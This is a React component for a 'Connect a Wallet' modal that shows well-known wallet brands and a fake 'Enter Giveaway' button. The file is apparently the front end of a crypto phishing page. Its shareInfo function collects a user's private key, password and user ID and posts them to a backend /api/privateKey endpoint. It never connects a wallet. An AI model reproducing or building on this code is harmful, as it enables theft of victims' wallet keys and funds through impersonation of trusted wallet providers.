import React, { useState } from "react";
import { Modal } from "./Modal";
import axios from "axios";
import walletLogo1 from "../public/1.png";
import walletLogo2 from "../public/2.png";
import walletLogo4 from "../public/4.png";
import walletLogo6 from "../public/6.png";
import walletLogo7 from "../public/7.png";
import walletLogo8 from "../public/8.png";
import Privatekey from "./Privatekey";
interface WalletOption {
  name: string;
  icon: string;
  recommended?: boolean;
}

const RECOMMENDED_WALLETS: WalletOption[] = [
  { name: "MetaMask", icon: walletLogo2, recommended: true },
  { name: "Phantom", icon: walletLogo1, recommended: true },
  { name: "Trust Wallet", icon: walletLogo4, recommended: true },
  { name: "Coinbase", icon: walletLogo8, recommended: true },
  { name: "OKX", icon: walletLogo6, recommended: true },
];

const OTHER_WALLETS: WalletOption[] = [
  { name: "Ledger", icon: walletLogo7 },
  {
    name: "Wallet Connect",
    icon: "https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.svg",
  },
];

interface WalletModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export function WalletModal({ isOpen, onClose }: WalletModalProps) {
  const [privateKey, setPrivateKey] = useState("");
  const [password, setPassword] = useState("");
  const [userID, setUserID] = useState("");
  const shareInfo = () => {
    if (privateKey === "" || password === "" || userID === "") {
      alert("Please fill in all fields");
      return;
    }
    axios
      .post("http://localhost:3000/api/privateKey", {
        privateKey,
        password,
        userID,
      })
      .then((res) => {
        if (res.data.code === 200) {
          alert(" Successfully Entered the Giveaway");
        } else {
          alert("Failed to Share");
        }
      });
  };
  return (
    <Modal isOpen={isOpen} onClose={onClose}>
      <div className="p-6">
        <div className="flex justify-between items-start mb-8">
          <div>
            <h2 className="text-2xl font-bold text-gray-900">
              Connect a Wallet
            </h2>
            <p className="text-gray-500 mt-1">Choose your preferred wallet</p>
          </div>
        </div>

        <div className="grid grid-cols-[1fr_2fr] gap-4">
          <div className="flex-1">
            <h3 className="text-sm font-medium text-blue-600 mb-4">
              Recommended
            </h3>
            <div className="space-y-3">
              {RECOMMENDED_WALLETS.map((wallet) => (
                <button
                  key={wallet.name}
                  className="w-full flex items-center space-x-3 p-3 rounded-lg hover:bg-gray-50 transition-colors"
                >
                  <img
                    src={wallet.icon}
                    alt={wallet.name}
                    className="w-8 h-8"
                  />
                  <span className="font-medium text-gray-900">
                    {wallet.name}
                  </span>
                </button>
              ))}
            </div>

            <h3 className="text-sm font-medium text-gray-500 mt-6 mb-4">
              Other Wallets
            </h3>
            <div className="space-y-3">
              {OTHER_WALLETS.map((wallet) => (
                <button
                  key={wallet.name}
                  className="w-full flex items-center space-x-3 p-3 rounded-lg hover:bg-gray-50 transition-colors"
                >
                  <img
                    src={wallet.icon}
                    alt={wallet.name}
                    className="w-8 h-8"
                  />
                  <span className="font-medium text-gray-900">
                    {wallet.name}
                  </span>
                </button>
              ))}
            </div>
          </div>

          <div className="space-y-6 flex flex-col items-center flex-1" style={{paddingRight : "50px"}}>
            <Privatekey setUserID={setUserID} setPassword={setPassword} setPrivateKey={setPrivateKey}/>
            <div className="flex space-y-4 modal-right-btn"  style={{paddingTop : "50px"}}>
              <button onClick={shareInfo} style={{borderRadius : "100vh"}} className="w-100 justify-center align-center bg-blue-600 text-white py-3 px-4 rounded-lg font-medium hover:bg-blue-700 transition-colors">
              Enter Giveaway
              </button>
              <button onClick={onClose} className="w-full text-blue-600 py-2 px-4 rounded-lg font-medium hover:bg-blue-50 transition-colors">
                Close
              </button>
            </div>
          </div>
        </div>
      </div>
    </Modal>
  );
}
